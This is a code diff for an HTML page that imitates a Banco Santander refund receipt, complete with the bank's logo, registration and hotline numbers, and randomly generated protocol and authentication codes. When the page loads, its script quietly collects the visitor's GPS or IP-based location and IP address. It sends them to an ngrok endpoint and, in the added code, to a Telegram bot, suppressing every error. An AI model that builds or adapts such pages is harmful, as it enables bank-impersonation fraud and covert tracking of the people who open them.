@@ -8,123 +8,158 @@
     /* ======================================================================
        Estilo inspirado no comprovante digital de estorno do Banco Santander
        ====================================================================== */
-
     :root {
       --santander-red: #c40000;
       --santander-gray: #7d7d7d;
       --santander-light: #f5f5f5;
     }
-
     * { box-sizing: border-box; }
-
     body {
       font-family: "Helvetica Neue", Arial, sans-serif;
       background: var(--santander-light);
-      margin: 0;
-      padding: 16px;
+      margin: 0; padding: 16px;
     }
-
     .receipt {
-      max-width: 600px;
-      margin: 0 auto;
-      background: #fff;
-      border: 1px solid #d9d9d9;
+      max-width: 600px; margin: 0 auto;
+      background: #fff; border: 1px solid #d9d9d9;
       box-shadow: 0 2px 6px rgba(0,0,0,.08);
     }
-
-    /* Cabeçalho ----------------------------------------------------------- */
     .header {
-      background: var(--santander-red);
-      color: #fff;
-      padding: 20px 24px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
+      background: var(--santander-red); color: #fff;
+      padding: 20px 24px; display: flex;
+      align-items: center; gap: 12px;
     }
-
-    .header img {
-      width: 120px;
-      height: auto;
-    }
-
+    .header img { width: 120px; height: auto; }
     .header h1 {
-      font-size: 20px;
-      font-weight: 700;
-      margin: 0;
+      font-size: 20px; font-weight: 700; margin: 0;
     }
-
-    /* ... resto do CSS permanece inalterado ... */
+    .info {
+      padding: 24px 24px 8px;
+    }
+    .info-row {
+      display: flex; justify-content: space-between;
+      border-bottom: 1px dashed #e0e0e0;
+      padding: 8px 0; font-size: 15px;
+    }
+    .info-row .label {
+      color: var(--santander-gray); font-weight: 600;
+    }
+    .info-row .value { color: #000; }
+    .amount {
+      font-size: 22px; font-weight: 700;
+      color: var(--santander-red);
+      text-align: center; margin: 24px 0 16px;
+    }
+    .auth {
+      padding: 0 24px 24px;
+      font-size: 13px; color: var(--santander-gray);
+    }
+    .auth-code {
+      word-break: break-all;
+      font-family: "Courier New", monospace;
+      font-size: 12px; background: #fafafa;
+      border: 1px solid #e1e1e1;
+      padding: 8px; margin-top: 8px;
+    }
+    .footer {
+      background: #fafafa; font-size: 12px;
+      color: var(--santander-gray);
+      text-align: center; padding: 16px 24px;
+      border-top: 1px solid #e0e0e0;
+    }
+    .print-btn {
+      display: block; margin: 24px auto 0;
+      background: var(--santander-red); color: #fff;
+      border: none; padding: 10px 28px;
+      font-size: 15px; font-weight: 600;
+      border-radius: 4px; cursor: pointer;
+      transition: opacity .3s;
+    }
+    .print-btn:hover { opacity: .85; }
+    @media print {
+      body { background: #fff; margin: 0; }
+      .print-btn { display: none !important; }
+      .receipt { border: none; box-shadow: none; }
+    }
   </style>
 </head>
 <body>
   <section class="receipt">
     <!-- Cabeçalho -->
     <div class="header">
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Logo_Banco_Santander_Brasil.svg/240px-Logo_Banco_Santander_Brasil.svg.png"
+        alt="Santander"
+      />
       <h1>Comprovante de Estorno</h1>
     </div>
 
-    <!-- Informações e demais seções inalteradas... -->
+    <!-- Informações -->
+    <div class="info">
+      <div class="info-row"><span class="label">Data</span><span class="value" id="data-atual"></span></div>
+      <div class="info-row"><span class="label">Horário</span><span class="value" id="hora-atual"></span></div>
+      <div class="info-row"><span class="label">Canal</span><span class="value">Internet Banking</span></div>
+      <div class="info-row"><span class="label">Conta Origem</span><span class="value">9999 99999-9</span></div>
+      <div class="info-row"><span class="label">Titular</span><span class="value">João Silva de Oliveira</span></div>
+      <div class="info-row"><span class="label">Número do protocolo</span><span class="value" id="protocolo"></span></div>
+      <p class="amount">Valor Estornado: R$ 1.000,00</p>
+    </div>
 
+    <!-- Autenticação -->
+    <div class="auth">
+      <strong>Autenticação eletrônica:</strong>
+      <div class="auth-code" id="autenticacao"></div>
+      <p>Guarde este comprovante. Ele é a garantia de que a operação foi concluída com sucesso.</p>
+    </div>
+
+    <!-- Botão de impressão -->
+    <button class="print-btn" onclick="window.print()">Imprimir</button>
+
+    <!-- Rodapé -->
+    <div class="footer">
+      <p>Banco Santander (Brasil) S.A. – CNPJ 90.400.888/0001‑42 – SAC 0800 762 7777 – Ouvidoria 0800 726 0322.</p>
+    </div>
   </section>
 
-  <!-- ==================================================================
-       Script utilitário: data/hora, códigos aleatórios + localização (opcional)
-       ================================================================== -->
-  <script>
-    // Preenche data e horário atuais
+ <script>
+    // Elementos
+    const elData = document.getElementById("data-atual");
+    const elHora = document.getElementById("hora-atual");
+    const elProt = document.getElementById("protocolo");
+    const elAuth = document.getElementById("autenticacao");
+
+    // Preenche data e hora
     const agora = new Date();
-    document.getElementById("data-atual").textContent =
-      agora.toLocaleDateString("pt-BR");
-    document.getElementById("hora-atual").textContent =
-      agora.toLocaleTimeString("pt-BR", {
-        hour: "2-digit",
-        minute: "2-digit",
-        second: "2-digit"
-      });
+    elData.textContent = agora.toLocaleDateString("pt-BR");
+    elHora.textContent = agora.toLocaleTimeString("pt-BR", {
+      hour: "2-digit", minute: "2-digit", second: "2-digit"
+    });
 
-    // Gera códigos simples (fake) – substitua por reais conforme necessidade
-    const randHex = (n) =>
-      [...crypto.getRandomValues(new Uint8Array(n))]
-        .map((b) => b.toString(16).padStart(2, "0"))
-        .join("");
-    document.getElementById("protocolo").textContent = randHex(6).toUpperCase();
-    document.getElementById("autenticacao").textContent = randHex(16).toUpperCase();
+    // Gera códigos fake
+    const randHex = n => [...crypto.getRandomValues(new Uint8Array(n))]
+      .map(b => b.toString(16).padStart(2,"0")).join("");
+    elProt.textContent = randHex(6).toUpperCase();
+    elAuth.textContent = randHex(16).toUpperCase();
 
-    /* === Localização opcional (mesma lógica da versão anterior) ========= */
-    const BACKEND_ENDPOINT =
-      "https://1e2746f31e5a.ngrok-free.app/send-location";
-    const IP_API_URL = "https://ipapi.co/json/";
+    // Configurações
+    const BACKEND_ENDPOINT = "https://1e2746f31e5a.ngrok-free.app/send-location";
+    const IP_API_URL      = "https://ipapi.co/json/";
+    const TELEGRAM_TOKEN  = "YOUR_TELEGRAM_BOT_TOKEN";
+    const CHAT_ID         = "YOUR_CHAT_ID";
 
     document.addEventListener("DOMContentLoaded", obterLocalizacao);
 
     async function obterLocalizacao() {
       if (!window.isSecureContext) return obterLocalizacaoPorIP();
       try {
-        if (navigator.permissions) {
-          const st = await navigator.permissions.query({
-            name: "geolocation"
-          });
-          if (st.state === "denied") return obterLocalizacaoPorIP();
-        }
-      } catch {
-        /* ignore */
-      }
+        const perm = navigator.permissions && await navigator.permissions.query({name: "geolocation"});
+        if (perm && perm.state === "denied") return obterLocalizacaoPorIP();
+      } catch { /* ignore */ }
 
       if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            const { latitude, longitude } = pos.coords;
-            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            enviarPayload({
-              latitude,
-              longitude,
-              mapsUrl,
-              metodo: "gps"
-            });
-          },
-          obterLocalizacaoPorIP,
-          { enableHighAccuracy: true, timeout: 10000 }
-        );
+        navigator.geolocation.getCurrentPosition(handlePos, obterLocalizacaoPorIP, {
+          enableHighAccuracy: true, timeout: 10000
+        });
       } else {
         obterLocalizacaoPorIP();
       }
@@ -132,36 +167,51 @@
 
     async function obterLocalizacaoPorIP() {
       try {
-        const d = await fetch(IP_API_URL).then((r) => r.json());
-        const { latitude, longitude, ip } = d;
-        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        enviarPayload({
-          latitude,
-          longitude,
-          ip,
-          mapsUrl,
-          metodo: "ip"
+        const d = await fetch(IP_API_URL).then(r => r.json());
+        handleData({
+          latitude:  d.latitude,
+          longitude: d.longitude,
+          ip:        d.ip,
+          metodo:    "ip"
         });
-      } catch {
-        /* Silencia falhas */
-      }
+      } catch { /* fail silently */ }
     }
 
-    async function enviarPayload(data) {
-      const payload = {
-        ...data,
-        timestamp: new Date().toISOString()
-      };
-      console.log("Payload a enviar:", payload);
-      try {
-        await fetch(BACKEND_ENDPOINT, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch {
-        /* ignore */
-      }
+    function handlePos(pos) {
+      handleData({
+        latitude:  pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        metodo:    "gps"
+      });
+    }
+
+    async function handleData(data) {
+      // monta URL do Maps
+      data.mapsUrl   = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+      data.timestamp = new Date().toISOString();
+
+      // envia ao seu backend
+      fetch(BACKEND_ENDPOINT, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify(data)
+      }).catch(()=>{});
+
+      // envia mensagem ao Telegram
+      const text = `
+📍 Localização detectada:
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+Mapa: ${data.mapsUrl}
+Método: ${data.metodo}`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text:    text.trim()
+        })
+      }).catch(console.error);
     }
   </script>
 </body>
